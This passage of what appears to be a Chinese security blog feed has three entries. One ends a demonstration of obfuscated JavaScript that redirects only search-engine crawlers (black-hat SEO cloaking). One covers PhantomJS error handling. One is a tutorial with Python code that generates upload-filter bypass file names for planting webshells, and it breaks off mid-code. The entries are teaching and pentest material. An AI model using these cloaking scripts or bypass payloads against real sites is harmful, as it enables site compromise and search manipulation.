class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)</span>&#123;e=<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">""</span>:e(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="built_in">String</span>.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)d[e(c)]=k[c]||e(c);k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>;&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p;&#125;(<span class="string">'5.8=6()&#123;1 2="9";1 4="a://b.7";1 3=c.h;g(3.i().d(2)&gt;=0)&#123;5.e.f=4&#125;&#125;'</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="string">'|var|keyword|ua|my_site|window|function|me|onload|baidu|http|gv7|navigator|indexOf|location|href|if|userAgent|toLowerCase'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;))</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="二、演示效果"><a href="#二、演示效果" class="headerlink" title="二、演示效果"></a>二、演示效果</h2><p>演示前，我们先为chrome浏览器添加一个百度爬虫的UA,以便模拟百度爬虫流量网页。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/an-interesting-dark-chain/chrome-setting.png" alt="为chrome浏览器添加一个百度爬虫的UA。"></p><p><strong>注意：使用burp或者chrome插件<code>User-Agent Switcher Options</code>修改的UA是无效的，因为它们只是修改了浏览器发送的数据包中的UA，而没有修改浏览器真正的UA。</strong></p><p>通过测试发现，在使用默认ua访问时，页面没有跳转。切换UA后成功跳转到我的博客。</p><p><img src="/articles/2019/an-interesting-dark-chain/show.gif" alt="效果展示"></p><h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p>写这篇文章并非鼓励大家去挂暗链，而是从攻防的角度，了解一些挂暗链的思路。使得在对抗黑帽SEO时能多些思路。比如就可以将浏览器UA修改为百度等搜索引擎爬虫的UA，尝试找出隐藏的暗链。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://blog.csdn.net/wangweiscsdn/article/details/73182320" target="_blank" rel="noopener">用js如何获取UA（user Agent）用户代理？</a></li><li><a href="https://blog.csdn.net/dengpeng0419/article/details/53591525" target="_blank" rel="noopener">【web开发 模拟ua调试】修改chrome浏览器的user agent</a></li><li><a href="https://muzi.kim/post/65.html" target="_blank" rel="noopener">对比中招网页暗链挂马，总结10种有趣的暗链代码并解析</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>解决jsEncrypter脚本错误代码不报错问题</title>
      <link href="/articles/2018/solve-jsEncrypter-script-error-code-is-not-wrong/"/>
      <url>/articles/2018/solve-jsEncrypter-script-error-code-is-not-wrong/</url>
      
        <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;用过我的<a href="https://github.com/c0ny1/jsEncrypter" target="_blank" rel="noopener">jsEncrypter</a>插件的朋友，可能会有一个遇到一个大坑： <strong>当编写前端加密调用脚本代码存在错误时，phantomJS不会报错，而且会进入假死，不能继续执行的状态。</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;如果前端的加密逻辑比较简单还好，当前端加密涉及多个js文件，逻辑比较复杂时，编写调用代码存在错误在所难免。这时如果phantomJS运行该脚本不报错提示就特别难受了，修改bug将变得很苦逼。这个问题在很久之前我已经能隐约感觉到了，而上周这个坑大大影响到了我的渗透测试，不得已只能百忙之中挤点时间来填坑。</p><h2 id="0x01-解决方案一：编码调式"><a href="#0x01-解决方案一：编码调式" class="headerlink" title="0x01 解决方案一：编码调式"></a>0x01 解决方案一：编码调式</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;在上周的渗透测试中，我遇到了一个前端加密传输的登录表单，涉及3个js文件，逻辑比较复杂。我编写前端加密调用脚本存在错误，phantomJS运行该脚本不报错不退出退出也不继续执行，我完全不知道出错在哪里。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;当时是通过<code>console.log()</code>函数进行调式的。一个值一个值的使用console.log()进行输出，在每个关键的判断语句内使用<code>console.log(&#39;run to here&#39;)</code>来确定逻辑走到哪里了。经过反复编码调式，最终锁定了错误位置和原因，原来是有一个值没有进行初始化。这个过程很费时间和精力orz！</p><h2 id="0x02-解决方案二：升级服务端脚本"><a href="#0x02-解决方案二：升级服务端脚本" class="headerlink" title="0x02 解决方案二：升级服务端脚本"></a>0x02 解决方案二：升级服务端脚本</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;今晚有点时间，思考了下编码调式虽然能解决问题，但升级服务端脚本，使其支持运行错误代码时能提示出错误信息以及涉及的代码行数才算治标治本。我在重新查看了<code>phantomJS</code>的官方文档后，给项目的<code>phantom_server.js</code>脚本添加了以下错误捕捉的代码，完整代码已经更新至github项目了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'\n-----------------Error Info--------------------'</span>)</span><br><span class="line"><span class="keyword">var</span> fullMessage = <span class="string">"Message: "</span>+e.toString() + <span class="string">':'</span>+ e.line;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">in</span> e) &#123;</span><br><span class="line">fullMessage += <span class="string">"\n"</span> + p.toUpperCase() + <span class="string">": "</span> + e[p];</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">console</span>.log(fullMessage);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'---------------------------------------------'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'[*] phantomJS exit!'</span>)</span><br><span class="line">phantom.exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我使用升级后的脚本模板，重新加入上周编写错误的前端加密调用代码。这次完美的报错了，提示如下：</p><p><img src="/articles/2018/solve-jsEncrypter-script-error-code-is-not-wrong/phantomjs_server_error_info.png" alt="图1-phantomjs_server.js报错"></p><p>这里简单跟大家说明下报错信息的含义。</p><p>Message为错误消息，内容如下。大概知道错误为类型错误，<code>a.pad</code>未定义。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeError: undefined is not an object (evaluating &apos;a.pad&apos;)</span><br></pre></td></tr></table></figure><p>STACK为堆栈跟踪，根据堆栈跟踪信息可以知道以下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">8.错误在函数_doFinalize()|文件aes.js 28行</span><br><span class="line">7.错误在函数finalize()|文件aes.js 25行</span><br><span class="line">6.错误在函数encrypt()|文件aes.js 29行</span><br><span class="line">5.错误在函数encrypt()|文件aes.js 25行</span><br><span class="line">4.错误在函数encrypt()|文件aes.js 25行</span><br><span class="line">3.错误在函数encrypt()|文件encrypt.js 27行</span><br><span class="line">2.错误在函数js_encrypt()|文件phantomjs_server.js 20行</span><br><span class="line">1.错误在phantomjs_server.js 38行</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;这样就跟我们的编程语言当中的报错堆栈跟踪很类似了。我们根据报错信息，然后顺着报错堆栈跟踪链很快就能定位到错误位置和原因了XD。</p><p>填坑先到这里吧，也不早了，晚安！</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://thief.one/2017/03/31/Phantomjs%E6%AD%A3%E7%A1%AE%E6%89%93%E5%BC%80%E6%96%B9%E5%BC%8F/" target="_blank" rel="noopener">【phantomjs系列】Phantomjs正确打开方式</a></li><li><a href="https://stackoverflow.com/questions/31322029/phantomjs-error-handling" target="_blank" rel="noopener">PhantomJS error handling</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jsEncrypter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>构造优质上传漏洞fuzz字典</title>
      <link href="/articles/2018/make-upload-vul-fuzz-dic/"/>
      <url>/articles/2018/make-upload-vul-fuzz-dic/</url>
      
        <content type="html"><![CDATA[<p>上传漏洞的利用姿势很多，同时也会因为语言，中间件，操作系统的不同，利用也不同。比如有：<code>大小写混合</code>，<code>.htaccess</code>,<code>解析漏洞</code>，<code>00截断</code>，<code>.绕过</code>，<code>空格绕过</code>，<code>::$DATA绕过</code>，以及多种姿势的组合等等。当遇到一个上传点，如何全面的利用以上姿势测试一遍，并快速发现可以成功上传webshell的姿势？</p><p><strong>方案一:一个一个手工测试</strong></p><p>手工把所有姿势测试一遍，先不说花费大量时间，还很可能会遗漏掉某些姿势而导致无法利用成功。</p><p><strong>方案二:fuzz</strong></p><p>在fuzz时我们往往会给一个输入点喂入大量特殊的数据。这个特殊的数据可能随机的，毫无规律的，甚至我们都无法预知的。但我思考了一下，这样的fuzz方式只是适合在本地fuzz 0day漏洞，并不适合通过fuzz在线网站的上传点，快速找出可以成功上传webshell的payload，因为时间成本排在哪里。</p><p>通过思考，我们可以知道如果能根据上传漏洞的场景（后端语言，中间件，操作系统）来生成优质的fuzz字典，然后使用该字典进行fuzz，就能消除以上两个解决方案的弊端！</p><h2 id="一、构想"><a href="#一、构想" class="headerlink" title="一、构想"></a>一、构想</h2><p>在动手之前我们来思考下上传漏洞跟那些因素有关：</p><p><strong>一、可解析的后缀，也就是该语言有多个可解析的后缀，比如php语言可解析的后缀为php,php2,php3等等</strong></p><p><strong>二、大小写混合，如果系统过滤不严，可能大小写可以绕过。</strong></p><p><strong>三、中间件，每款中间件基本都解析漏洞,比如iis就可以把xxx.asp;.jpg当asp来执行。</strong></p><p><strong>四、系统特性，特别是Windows的后缀加点（.）,加空格，加::$DATA可以绕过目标系统。</strong></p><p><strong>五、语言漏洞，流行的三种脚本语言基本都存在00截断漏洞。</strong></p><p><strong>六、双后缀，这个与系统和中间件无关，偶尔会存在于代码逻辑之中。</strong></p><p>整理以上思考，我们把生成字典的规则梳理为以下几条</p><ol><li>可解析的后缀+大小写混合</li><li>可解析的后缀+大小写混合+中间件漏洞</li><li>.htaccess + 大小写混合</li><li>可解析的后缀+大小写混合+系统特性</li><li>可解析的后缀+大小写混合+语言漏洞</li><li>可解析的后缀+大小写混合+双后缀</li></ol><p>下面我们根据上面的构想，来分析每一方面的细节，并使用代码来实现。</p><h2 id="二、可解析后缀"><a href="#二、可解析后缀" class="headerlink" title="二、可解析后缀"></a>二、可解析后缀</h2><p>其实很多语言都这样，有多个可以解析后缀。当目标站点采用黑名单时，往往包含不全。以下我收集相对比较全面的可解析后缀，为后面生成字典做材料。</p><table><thead><tr><th align="left">语言</th><th align="left">可解析后缀</th></tr></thead><tbody><tr><td align="left">asp/aspx</td><td align="left">asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr</td></tr><tr><td align="left">php</td><td align="left">php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml</td></tr><tr><td align="left">jsp</td><td align="left">jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml</td></tr></tbody></table><h2 id="三、大小写混合"><a href="#三、大小写混合" class="headerlink" title="三、大小写混合"></a>三、大小写混合</h2><p>有些网站过滤比较简单，只是过滤了脚本后缀，但是没有对后缀进行统一转换为小写，在进行判断。这就纯在一个大小写问题。这里我们可以编写两个函数，一个函数是传入一个字符串，函数返回该字符串所有大小写组合的可能，第二个函数是基于第一个函数，把一个list的传入返回一个list内所有字符的所有大小写组合的可能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 字符串大小写混合，返回字符串所有大写可能</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_case_mixing</span><span class="params">(word)</span>:</span></span><br><span class="line">str_list = []</span><br><span class="line">word = word.lower()</span><br><span class="line">tempWord = copy.deepcopy(word)</span><br><span class="line">plist = []</span><br><span class="line">redict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> range( len( tempWord ) ):</span><br><span class="line">char = word[char]</span><br><span class="line">plist.append(char) </span><br><span class="line">num = len( plist )</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range( num ):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range( i , num + <span class="number">1</span> ):</span><br><span class="line">sContent = <span class="string">''</span>.join( plist[<span class="number">0</span>:i] )</span><br><span class="line">mContent = <span class="string">''</span>.join( plist[i:j] )</span><br><span class="line">mContent = mContent.upper()</span><br><span class="line">eContent = <span class="string">''</span>.join( plist[j:] )</span><br><span class="line">content = <span class="string">'''%s%s%s'''</span> % (sContent,mContent,eContent)</span><br><span class="line">redict[content] = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> redict.keys():</span><br><span class="line">str_list.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> str_list</span><br><span class="line"></span><br><span class="line"><span class="comment">## list大小写混合</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_case_mixing</span><span class="params">(li)</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> li:</span><br><span class="line">res += uperTest(l)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h2 id="四、中间件的漏洞"><a href="#四、中间件的漏洞" class="headerlink" title="四、中间件的漏洞"></a>四、中间件的漏洞</h2><p>这块是比较复杂的一块。首先我们先来梳理下</p><h3 id="4-1-iis"><a href="#4-1-iis" class="headerlink" title="4.1 iis"></a>4.1 iis</h3><p>iis一共有三个解析漏洞：</p><p>1.IIS6.0文件解析 xx.asp;.jpg<br>2.IIS6.0目录解析 xx.asp/1.jpg<br>3.IIS 7.0畸形解析 xxx.jpg/x.asp</p><p>由于2和3和上传的文件名无关，故我们只根据1来生成fuzz字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iis_suffix_creater</span><span class="params">(suffix)</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> suffix:</span><br><span class="line">str =<span class="string">'%s;.%s'</span> % (l,allow_suffix)</span><br><span class="line">res.append(str)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="4-2-apache"><a href="#4-2-apache" class="headerlink" title="4.2 apache"></a>4.2 apache</h3><p>apache相关的解析漏洞有两个：</p><ol><li>%0a(CVE-2017-15715)</li><li>未知后缀 test.php.xxx</li></ol><p>根据以上构造<code>apache_suffix_builder</code>函数生成规则</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">apache_suffix_creater</span><span class="params">(suffix)</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> suffix:</span><br><span class="line">str = <span class="string">'%s.xxx'</span> % l</span><br><span class="line">res.append(str)</span><br><span class="line">str = <span class="string">'%s%s'</span> % (l,urllib.unquote(<span class="string">'%0a'</span>)) <span class="comment">#CVE-2017-15715</span></span><br><span class="line">res.append(str)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="4-3-nginx"><a href="#4-3-nginx" class="headerlink" title="4.3 nginx"></a>4.3 nginx</h3><p>nginx解析漏洞有三个：</p><ol><li>访问连接加/xxx.php test.jpg/xxx.php</li><li>畸形解析漏洞 test.jpg%00xxx.php</li><li>CVE-2013-4547 test.jpg(非编码空格)\0x.php</li></ol><p>nginx的解析漏洞，由于和上传的文件名无关，故生成字典无需考虑。</p><h3 id="4-4-tomcat"><a href="#4-4-tomcat" class="headerlink" title="4.4 tomcat"></a>4.4 tomcat</h3><p>tomcat用于上传绕过的有三种,不过限制在windows操作系统下。</p><ol><li>xxx.jsp/</li><li>xxx.jsp%20</li><li>xxx.jsp::$DATA</li></ol><p>根据以上规则生成字典对应的代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">win_tomcat = [<span class="string">'%20'</span>,<span class="string">'::$DATA'</span>,<span class="string">'/'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tomcat_suffix_creater</span><span class="params">(suffix)</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> suffix:</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> win_tomcat:</span><br><span class="line">str = <span class="string">'%s%s'</span> % (l,t)</span><br><span class="line">res.append(str)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>如果确定中间件为apache,可以加入.htaccess。同时如果操作系统还为windows，我们可以大小写混合。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (middleware == <span class="string">'apache'</span> <span class="keyword">or</span> middleware == <span class="string">'all'</span>) <span class="keyword">and</span> (os == <span class="string">'win'</span> <span class="keyword">or</span> os == <span class="string">'all'</span>):</span><br><span class="line">htaccess_suffix = uperTest(<span class="string">".htaccess"</span>)</span><br><span class="line"><span class="keyword">elif</span> (middleware == <span class="string">'apache'</span> <span class="keyword">or</span> middleware == <span class="string">'all'</span>) <span class="keyword">and</span> os == <span class="string">'linux'</span>:</span><br><span class="line">htaccess_suffix = [<span class="string">'.htaccess'</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">htaccess_suffix = []</span><br></pre></td></tr></table></figure><h3 id="4-5-语言，中间件与操作系统的关系"><a href="#4-5-语言，中间件与操作系统的关系" class="headerlink" title="4.5 语言，中间件与操作系统的关系"></a>4.5 语言，中间件与操作系统的关系</h3><p>以上我们根据每个中间件的漏洞，编写了对应的fuzz字典生成函数。在最终生成字典时，我们还要考虑中间件可以运行那些语言，以及它们与平台的关系。</p><table><thead><tr><th align="left">语言</th><th align="center">IIS</th><th align="center">Apache</th><th align="center">Tomcat</th><th align="center">Window</th><th align="center">Linux</th></tr></thead><tbody><tr><td align="left">asp/aspx</td><td align="center">√</td><td align="center">√</td><td align="center">×</td><td align="center">√</td><td align="center">√</td></tr><tr><td align="left">php</td><td align="center">√</td><td align="center">√</td><td align="center">√</td><td align="center">√</td><td align="center">√</td></tr><tr><td align="left">jsp</td><td align="center">√</td><td align="center">×</td><td align="center">√</td><td align="center">√</td><td align="center">√</td></tr></tbody></table><p>根据上表，我们明白</p><ul><li>iis下可以运行asp/aspx,php,jsp脚本，故这3种脚本语言可解析后缀均应该传入iis_suffix_builder()进行处理</li><li>apache下可以运行asp/aspx,php。故这2两种脚本语言可解析后缀均应该传入apache_suffix_builder()进行处理</li><li>tomcat下可以运行php，jsp，故这两个脚本语言可解析后缀均应该传入tomcat_suffix_builder()进行处理。</li><li>注意：根据对tomcat上传的绕过分析，发现之后在windows平台下才能成功。故之后在Windows平台下才会调用<code>tomcat_suffix_builder()</code>对可解析后缀进行处理。</li></ul><p>故伪代码可以编写如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> middleware == <span class="string">'iis'</span>:</span><br><span class="line">case_asp_php_jsp_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_jsp_parse_suffix</span><br><span class="line">middleware_parse_suffix = iis_suffix_creater(case_asp_php_jsp_parse_suffix)</span><br><span class="line"><span class="keyword">elif</span> middleware == <span class="string">'apache'</span>:</span><br><span class="line">case_asp_php_html_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_html_parse_suffix</span><br><span class="line">middleware_parse_suffix = apache_suffix_creater(case_asp_php_html_parse_suffix)</span><br><span class="line"><span class="keyword">elif</span> middleware == <span class="string">'tomcat'</span> <span class="keyword">and</span> os == <span class="string">'linux'</span>:</span><br><span class="line">middleware_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix</span><br><span class="line"><span class="keyword">elif</span> middleware == <span class="string">'tomcat'</span> <span class="keyword">and</span> (os == <span class="string">'win'</span> <span class="keyword">or</span> os == <span class="string">'all'</span>):</span><br><span class="line">case_php_jsp_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix</span><br><span class="line">middleware_parse_suffix = tomcat_suffix_creater(case_php_jsp_parse_suffix)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">case_asp_php_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix</span><br><span class="line">iis_parse_suffix = iis_suffix_creater(case_asp_php_parse_suffix)</span><br><span class="line">case_asp_php_html_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_html_parse_suffix</span><br><span class="line">apache_parse_suffix = apache_build(case_asp_php_html_parse_suffix)</span><br><span class="line">case_php_jsp_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix</span><br><span class="line">tomcat_parse_suffix = tomcat_build(case_php_jsp_parse_suffix)</span><br><span class="line">middleware_parse_suffix = iis_parse_suffix + apache_parse_suffix + tomcat_parse_suffix</span><br></pre></td></tr></table></figure><h2 id="五、系统特性"><a href="#五、系统特性" class="headerlink" title="五、系统特性"></a>五、系统特性</h2><p>经过查资料，目前发现在系统层面，有以下特性可以被上传漏洞所利用。</p><ul><li>Windows下文件名不区分大小写，Linux下文件名区分大写欧西</li><li>Windows下ADS流特性，导致上传文件xxx.php::$DATA = xxx.php</li><li>Windows下文件名结尾加入<code>.</code>,<code>空格</code>,<code>&lt;</code>,·<code>&gt;</code>,<code>&gt;&gt;&gt;</code>,<code>0x81-0xff</code>等字符，最终生成的文件均被windows忽略。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成0x81-0xff的字符list</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_81_to_ff</span><span class="params">()</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">129</span>,<span class="number">256</span>):</span><br><span class="line">str = <span class="string">'%x'</span> % i</span><br><span class="line">str = <span class="string">'%'</span> + str</span><br><span class="line">str = urllib.unquote(str)</span><br><span class="line">res.append(str)</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">windows_os = [<span class="string">' '</span>,<span class="string">'.'</span>,<span class="string">'/'</span>,<span class="string">'::$DATA'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'&gt;&gt;&gt;'</span>,<span class="string">'%20'</span>,<span class="string">'%00'</span>] + str_81_to_ff()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">windows_suffix_builder</span><span class="params">(suffix)</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> suffix:</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> windows_os:</span><br><span class="line">str = <span class="string">'%s%s'</span> % (s,w)</span><br><span class="line">res.append(str)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h2 id="六、语言的漏洞"><a href="#六、语言的漏洞" class="headerlink" title="六、语言的漏洞"></a>六、语言的漏洞</h2><p>语言漏洞被利用于上传的有%00截断和0x00截断。它们在asp，php和jsp中都存在着。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_00_truncation</span><span class="params">(suffix,allow_suffix)</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> suffix:</span><br><span class="line">str = <span class="string">'%s%s.%s'</span> % (i,<span class="string">'%00'</span>,allow_suffix)</span><br><span class="line">res.append(str)</span><br><span class="line">str = <span class="string">'%s%s.%s'</span> % (i,urllib.unquote(<span class="string">'%00'</span>),allow_suffix)</span><br><span class="line">res.append(str)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h2 id="七、双后缀"><a href="#七、双后缀" class="headerlink" title="七、双后缀"></a>七、双后缀</h2><p>有些站点通过对上传文件名进行删除敏感字符（php,asp,jsp等等）的方式进行过滤,例如你上传一个aphp.jpg的文件，那么上传之后就变成了a.jpg。这时就可以利用双后缀的方式上传一个a.pphphp,最终正好生成a.php。其实双后缀与中间件和操作系统无关，而是和代码逻辑有关。</p><p>针对双后缀，我们可以写个<code>str_double_suffix_creater(suffix)</code>函数，传入后缀名suffix即可生成所有的双后缀可能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_double_suffix_creater</span><span class="params">(suffix)</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(suffix)):</span><br><span class="line">str = list(suffix)</span><br><span class="line">str.insert(i,suffix)</span><br><span class="line">res.append(<span class="string">""</span>.join(str))</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>在<code>list_double_suffix_creater(suffix)</code>函数基础上，<br>可以编写<code>list_double_suffix_creater(list_suffix)</code>来为一个list生成所有双后缀可能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 